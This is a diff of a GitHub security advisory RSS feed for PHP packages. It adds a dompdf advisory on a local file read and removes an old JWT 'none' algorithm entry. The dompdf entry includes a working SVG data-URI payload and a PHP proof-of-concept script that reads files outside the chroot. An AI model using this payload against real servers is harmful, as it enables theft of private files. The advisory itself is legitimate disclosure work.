@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/composer.rss</id>
     <title>Security Advisory for PHP packages hosted at packagist.org</title>
-    <updated>2026-07-22T21:15:07.404Z</updated>
+    <updated>2026-07-22T22:16:45.681Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
     <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
@@ -11,6 +11,124 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[dompdf/dompdf] Dompdf: Local file read due to improper file path validation in SVG images encoded as data-URI]]></title>
+        <id>https://github.com/advisories/GHSA-cx96-42px-69fm</id>
+        <link href="https://github.com/advisories/GHSA-cx96-42px-69fm"/>
+        <updated>2026-07-22T21:30:06.000Z</updated>
+        <content type="html"><![CDATA[<p><strong>Description:</strong> An attacker, who controls the HTML input supplied to dompdf, can read arbitrary images from the server’s file system, bypassing the <code>chroot</code> restriction. The vulnerability is exploitable in the default configuration.
+<strong>Exploitation conditions:</strong> An external user
+<strong>Researcher:</strong> Nikita Sveshnikov (Positive Technologies)</p>
+<h2 id="research">Research</h2>
+<p>dompdf restricts access to local files using the <code>chroot</code> mechanism. By default, <code>chroot</code> is set to the root directory of dompdf (<code>Options.php:350-351</code>):</p>
+<p><em>Listing 1. <code>chroot</code> settings</em></p>
+<pre><code>$rootDir = realpath(__DIR__ . "/../");
+$this-&gt;setChroot(array($rootDir));
+// result: chroot = ["/path/to/vendor/dompdf/dompdf"]
+</code></pre>
+<p>When the HTML references a local file, <code>Options::validateLocalUri()</code> checks that the path resides within <code>сhroot</code>. A direct link to the file outside this directory is correctly blocked:</p>
+<p><em>Listing 2. Blocking link</em></p>
+<pre><code>&lt;!-- BLOCKED: /tmp/ is outside chroot --&gt;
+&lt;img src="file:///tmp/secret.png"&gt;
+</code></pre>
+<h3 id="how-the-protection-is-bypassed">How the protection is bypassed:</h3>
+<p>An attacker wraps the link to the target file in SVG format and delivers it via <code>data:</code> URI:</p>
+<p><em>Listing 3. Wrapping link in SVG</em></p>
+<pre><code>&lt;img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0i..."&gt;
+</code></pre>
+<p>Inside the base64 payload is an SVG containing the <code>&lt;image&gt;</code> element that points to the target file:</p>
+<p><em>Listing 4. Pointing to the target file</em></p>
+<pre><code>&lt;svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+     width="589" height="415"&gt;
+  &lt;image xlink:href="/tmp/secret.png" x="0" y="0" width="589" height="415"/&gt;
+&lt;/svg&gt;
+</code></pre>
+<h3 id="why-the-bypass-works">Why the bypass works:</h3>
+<p>The issue is that dompdf handles the SVG twice: first through its own validator and then via  <code>php-svg-lib</code> — and the second pass does not apply the protection that the first pass does.</p>
+<p><strong>Step 1.</strong> The <code>data://</code> protocol has no validation rules (<code>Options.php:546-547</code>):</p>
+<p><em>Listing 5. Lack of rules</em></p>
+<pre><code>case "data://":
+    break;  // no rules
+</code></pre>
+<p>SVG content passes without any checks.</p>
+<p><strong>Step 2.</strong> dompdf pre‑parses the SVG and validates the links inside it (<code>Cache.php:137-183</code>), but incorrectly interprets the path of an external resource (image) reference when the SVG is data-URI encoded.</p>
+<p><strong>Step 3.</strong> When rendering, the PDF backend passes the SVG to <code>php-svg-lib</code> with external links enabled (<code>lib/Cpdf.php:6315-6319</code>):</p>
+<p><em>Listing 6. Passing the SVG</em></p>
+<pre><code>$doc = new \Svg\Document();
+$doc-&gt;allowExternalReferences = true;  // forced
+$doc-&gt;loadFile($file);
+</code></pre>
+<p><code>php-svg-lib</code> is a separate library that has no information about the <code>chroot</code> directory or the dompdf validation rules.</p>
+<p><strong>Step 4.</strong> The <code>&lt;image&gt;</code> handler in <code>php-svg-lib</code> blocks only <code>phar://</code>, everything else is allowed when allowExternalReferences is true (<code>php-svg-lib/src/Svg/Tag/Image.php:60-68</code>):</p>
+<p><em>Listing 7. <code>phar://</code> blocking</em></p>
+<pre><code>if ($scheme === "phar"
+    || ($this-&gt;document-&gt;allowExternalReferences === false &amp;&amp; $scheme !== "data")) {
+    return;
+}
+$this-&gt;document-&gt;getSurface()-&gt;drawImage($this-&gt;href, ...);
+</code></pre>
+<p><strong>Step 5.</strong> <code>drawImage()</code> invokes <code>file_get_contents()</code> with no restrictions (<code>php-svg-lib/src/Svg/Surface/SurfaceCpdf.php:171-172</code>):</p>
+<p><em>Listing 8. <code>file_get_contents()</code> call</em></p>
+<pre><code>$data = file_get_contents($image);  // reads ANY path
+</code></pre>
+<p>There is no chroot check. No protocol validation. The file is read and embedded into the PDF.</p>
+<h3 id="an-example-of-exploitation">An example of exploitation:</h3>
+<p><em>Listing 9. An example of a vulnerable code (html2pdf.php)</em></p>
+<pre><code>require_once __DIR__ . '/vendor/autoload.php';
+
+$dompdf = new Dompdf\Dompdf();
+$dompdf-&gt;loadHtml($_POST['html']);
+$dompdf-&gt;render();
+$dompdf-&gt;stream('poc.pdf', ['Attachment' =&gt; false]);
+</code></pre>
+<p><em>Listing 10. An example attack on the vulnerable code</em></p>
+<pre><code>$file = $_GET['file'] ?? '/tmp/user_files/user_1/private_image.png';
+
+$svg = '&lt;svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="589" height="415"&gt;'
+     . '&lt;image xlink:href="' . htmlspecialchars($file, ENT_QUOTES) . '" x="0" y="0" width="589" height="415"/&gt;'
+     . '&lt;/svg&gt;';
+
+$html = '&lt;html&gt;&lt;body&gt;'
+      . '&lt;img src="data:image/svg+xml;base64,' . base64_encode($svg) . '"&gt;'
+      . '&lt;/body&gt;&lt;/html&gt;';
+
+$url = 'http://example.com/html2pdf.php';
+$data = ['html' =&gt; $html];
+$headers = ["Content-type: application/x-www-form-urlencoded"];
+
+// use key 'http' even if you send the request to https://...
+$options = [
+    'http' =&gt; [
+        'header' =&gt; $headers,
+        'method' =&gt; 'POST',
+        'content' =&gt; http_build_query($data),
+        'ignore_errors' =&gt; true,
+    ],
+];
+$context = stream_context_create($options);
+$response = file_get_contents($url, false, $context);
+</code></pre>
+<p><em>Figure 1. The image was read successfully</em>
+<img src="https://github.com/user-attachments/assets/9a4ba3b7-df24-4c20-9dc4-55104ad905c2" alt="image" height="404" width="875"></p>
+<h2 id="credits">Credits</h2>
+<p>Nikita Sveshnikov (Positive Technologies)</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/dompdf/dompdf/security/advisories/GHSA-cx96-42px-69fm">https://github.com/dompdf/dompdf/security/advisories/GHSA-cx96-42px-69fm</a></li>
+<li><a href="https://github.com/dompdf/dompdf/commit/6a58996865db05d8fede748507e50ac4b8c5bfd0">https://github.com/dompdf/dompdf/commit/6a58996865db05d8fede748507e50ac4b8c5bfd0</a></li>
+<li><a href="https://github.com/dompdf/dompdf/commit/bf7b02f642e26007dedc5a22b3d6e15f9931120a">https://github.com/dompdf/dompdf/commit/bf7b02f642e26007dedc5a22b3d6e15f9931120a</a></li>
+<li><a href="https://github.com/dompdf/dompdf/releases/tag/v3.1.6">https://github.com/dompdf/dompdf/releases/tag/v3.1.6</a></li>
+<li><a href="https://github.com/advisories/GHSA-cx96-42px-69fm">https://github.com/advisories/GHSA-cx96-42px-69fm</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-cx96-42px-69fm</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-22T21:30:01.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[dompdf/dompdf] Dompdf: File existence oracle via font-face stylesheet declaration]]></title>
         <id>https://github.com/advisories/GHSA-7x2p-4jvh-6384</id>
@@ -1032,28 +1150,5 @@ pheditor-terminal-bypass
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-07-16T20:01:05.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[gree/jose] gree/jose - "None" Algorithm treated as valid in tokens]]></title>
-        <id>https://github.com/advisories/GHSA-9gxv-x7rp-r2hc</id>
-        <link href="https://github.com/advisories/GHSA-9gxv-x7rp-r2hc"/>
-        <updated>2026-07-16T18:46:46.000Z</updated>
-        <content type="html"><![CDATA[<p>Several widely-used JSON Web Token (JWT) libraries, including node-jsonwebtoken, pyjwt, namshi/jose, php-jwt, and jsjwt, are affected by critical vulnerabilities that could allow attackers to bypass the verification step when using asymmetric keys (RS256, RS384, RS512, ES256, ES384, ES512).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://auth0.com/blog/2015/03/31/critical-vulnerabilities-in-json-web-token-libraries">https://auth0.com/blog/2015/03/31/critical-vulnerabilities-in-json-web-token-libraries</a></li>
-<li><a href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries">https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries</a></li>
-<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/gree/jose/2016-08-30.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/gree/jose/2016-08-30.yaml</a></li>
-<li><a href="https://github.com/nov/jose-php/compare/2.2.0...2.2.1">https://github.com/nov/jose-php/compare/2.2.0...2.2.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-9gxv-x7rp-r2hc">https://github.com/advisories/GHSA-9gxv-x7rp-r2hc</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-9gxv-x7rp-r2hc</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2024-05-15T21:47:39.000Z</published>
     </entry>
 </feed>
